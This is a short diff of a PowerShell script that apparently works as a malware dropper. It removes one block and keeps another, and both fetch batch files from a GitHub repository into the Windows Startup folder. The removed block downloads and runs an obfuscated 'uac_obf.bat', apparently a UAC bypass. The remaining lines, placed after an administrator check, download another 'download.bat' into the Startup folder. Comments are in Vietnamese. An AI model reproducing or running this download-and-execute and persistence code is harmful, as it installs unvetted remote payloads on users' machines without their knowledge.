@@ -54,11 +54,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         
         $outputFile = "$startupfolder\download.bat"
         
-        # Kiểm tra mức độ UAC và in thông báo
-        $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/uac_obf.bat"
-        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
-        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
-        Write-Output "Khởi chạy tệp batch."
 
         $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
         Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
